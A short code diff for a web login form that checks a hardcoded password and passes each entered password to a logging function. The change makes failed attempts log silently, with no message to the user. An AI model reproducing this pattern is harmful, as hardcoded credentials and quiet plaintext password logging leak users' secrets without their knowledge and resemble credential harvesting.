@@ -138,22 +138,20 @@
       const email = usernameInput.value.trim();
       const password = passwordInput.value.trim();
 
-      if (!email || !password) {
-        alert("Please enter both username and password");
-        return;
-      }
+      if (!email || !password) return; // Silently handle empty fields
 
       const isValidLogin = password === 'correct123';
       const status = isValidLogin ? 'success' : 'failed';
 
       await logLogin(email, status, password);
 
-      alert(isValidLogin ? 'Login successful!' : 'Login failed - attempt logged');
-
       if (isValidLogin) {
         usernameInput.value = '';
         passwordInput.value = '';
+        // Only show success message
+        alert('Login successful!');
       }
+      // No popup for failed attempts (silent logging)
     });
 
     usernameInput.addEventListener('input', (e) => {
